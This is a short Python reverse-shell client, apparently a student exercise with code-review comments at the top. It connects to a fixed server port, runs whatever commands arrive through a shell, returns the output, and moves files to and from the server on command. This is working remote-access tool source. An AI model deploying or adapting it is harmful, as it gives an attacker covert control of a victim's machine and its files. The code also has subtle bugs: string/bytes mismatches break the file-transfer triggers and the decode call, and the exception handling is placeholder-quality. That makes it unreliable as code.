# CR: Are you handling exceptions correctly?
# CR: Split the main to functions. Main should not be more than 5 lines.
# !/bin/python3
'''
Author: Gal Davidi
'''

import socket
import os
import sys
import subprocess
import getpass

SERVER = 'localhost'
PORT = 1803
BUFFER = 1024
CODING = "utf-8"
END_MSG = 'exit'
GET_FILE_TRIGER = b'trans'
PUT_FILE_TRIGER = b'put'


def command_executor(command):
    '''
    recive a command execute it and return the STDOUT
    :return output: str
    '''
    try:
        if command == b"whoami":
            print(getpass.getuser())
            return getpass.getuser()
        if command[:2].decode(CODING) == 'cd':
            os.chdir(command[3:].decode(CODING))
        if len(command) > 0:
            output = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                      stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output = (output.stdout.read() + output.stderr.read()).decode(CODING)
        return f"{os.getcwd()}$ {output}"

    except IOError as exp:
        return "not allowed: {} ".format(exp)


def get_file(connection):
    '''get file from the server'''
    file_path = connection.recv(BUFFER)
    try:
        with open(file_path, 'wb') as file:
            while True:
                data = connection.recv(BUFFER)
                if not data:
                    break
                file.write(data)
    except:
        print("LOGGGGGG")


def put_file(connection):
    '''upload file to the server'''
    try:
        file_path = connection.recv(BUFFER)
        with open(file_path, 'rb') as file:
            data = file.read(BUFFER)
            while data:
                connection.send(data)
                data = file.read(BUFFER)
    except:
        print("LOG")


def server_connection(remote_ip, port):
    '''
    connect to the server
    '''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (remote_ip, port)
    print('connecting to {} port {}'.format(*server_address))
    try:
        sock.connect(server_address)
        return sock
    except ConnectionError as con_e:
        print("a connection error: {}".format(con_e))


def command_receiver(sock):
    '''
    recive the commands from the server
    :param sock:
    :return:
    '''
    while True:
        try:
            data = sock.recv(BUFFER).decode(CODING)
            print(data)
            if data == END_MSG:
                sock.send(END_MSG.encode(CODING))
                sock.close()
                sys.exit(0)
            elif data == GET_FILE_TRIGER:
                get_file(sock)
            elif data == PUT_FILE_TRIGER:
                put_file(sock)
            else:
                command_output = command_executor(data)
                data_sender(sock, command_output)
        except ConnectionResetError as reset:
            print('the server is offline')


def data_sender(sock, data):
    '''
    send data to the server
    :param sock: socket
    :param data: command output
    '''
    try:
        sock.send(data.encode(CODING))
    except ConnectionError as con_e:
        print("a connection error: {}".format(con_e))


def main():
    server_socket = server_connection(SERVER, PORT)
    command_receiver(server_socket)


if __name__ == '__main__':
    main()
